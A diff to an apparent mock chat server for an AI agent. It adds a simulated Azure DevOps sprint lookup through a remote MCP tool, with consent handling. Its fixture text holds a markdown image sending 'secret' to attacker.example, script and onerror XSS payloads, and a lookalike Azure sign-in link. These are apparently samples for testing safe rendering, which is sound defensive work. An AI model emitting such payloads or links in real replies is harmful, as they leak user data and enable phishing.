@@ -4,6 +4,7 @@ import type { IncomingMessage, ServerResponse } from 'node:http';
 import { agents, versionOf } from './agents.ts';
 import { approvalsOfConversation, requestFromChat } from './approvals.ts';
 import { recordAudit } from './audit.ts';
+import { firstUsableRemote, isConnected, markConsentPending } from './connections.ts';
 import { newId, readBody, sendError, sendJson, type ApiHandler } from './http.ts';
 
 interface StoredMessage {
@@ -16,6 +17,9 @@ interface StoredMessage {
   approvals?: string[];
   /** Sources of the answer: knowledge base, document and page, never text (D88 (44)). */
   citations?: { knowledge_base: string; document: string; page?: number }[];
+  /** Remote registrations that asked to connect, and the ones that answered (D98 (20)). */
+  connection_required?: string[];
+  remote_sources?: string[];
 }
 
 interface StoredConversation {
@@ -55,6 +59,18 @@ Recomendaciones:
 - Imagen remota bloqueada: ![pixel](https://attacker.example/p.png?d=secret)
 - HTML crudo descartado: <script>alert(1)</script><img src=x onerror=alert(1)><b>negrita html</b>
 `;
+
+/** What a remote MCP returned, with links of the company, of another organization and of
+ * another domain (design remote-core.jsx `RM_READ`). Placeholder content, never real. */
+const REMOTE_ANSWER = `Encontré 3 work items abiertos del sprint 42 en **Plataforma**:
+
+| ID | Título | Estado |
+|---|---|---|
+| 1287 | Migrar el pipeline de despliegue | Activo |
+| 1291 | Rotar certificados de staging | Nuevo |
+| 1302 | Revisar alertas de costo | Activo |
+
+La página del sprint está en la [wiki de Plataforma](https://dev.azure.com/empresa/Plataforma/_wiki/wikis/Plataforma.wiki/12). La misma página dice que el tablero completo está en [el tablero](https://dev.azure.com/plataforma-tableros/_signin) y que, si no carga, entres por [este enlace](https://azure-devops-signin.example.net/login).`;
 
 function chunkText(text: string, size: number): string[] {
   const chunks: string[] = [];
@@ -267,6 +283,46 @@ async function handleChat(req: IncomingMessage, res: ServerResponse): Promise<vo
       stop_reason: 'end_turn',
       usage: { input_tokens: 420, output_tokens: 60 },
       cost_usd: '0.0031',
+    });
+    res.end();
+    return;
+  }
+  // "sprint": the agent reads Azure DevOps through a remote MCP (D93). Without a connection the
+  // tool answers `consent_required` and the stream says which registration, never a URL.
+  const remote = /sprint/i.test(message) ? firstUsableRemote() : null;
+  if (remote) {
+    const tool = 'wit_work_item';
+    send('tool', { name: tool, status: 'started' });
+    send('status', { phase: 'tool', tool });
+    await sleep(400);
+    const ready = isConnected(remote.id);
+    send('tool', { name: tool, status: ready ? 'completed' : 'error' });
+    if (!ready) {
+      markConsentPending(remote.id);
+      send('remote_connection_required', { registration_id: remote.id });
+    }
+    send('status', { phase: 'writing' });
+    const reply = ready
+      ? REMOTE_ANSWER
+      : 'Necesito que conectes tu cuenta de Azure DevOps para leer el sprint.';
+    send('delta', { text: reply });
+    const replyId = newId();
+    conversation.messages.push({
+      message_id: replyId,
+      role: 'assistant',
+      content: reply,
+      created_at: new Date().toISOString(),
+      tools: [
+        { name: tool, status: 'started' },
+        { name: tool, status: ready ? 'completed' : 'error' },
+      ],
+      ...(ready ? { remote_sources: [remote.id] } : { connection_required: [remote.id] }),
+    });
+    send('done', {
+      message_id: replyId,
+      stop_reason: 'end_turn',
+      usage: { input_tokens: 610, output_tokens: 140 },
+      cost_usd: '0.0042',
     });
     res.end();
     return;
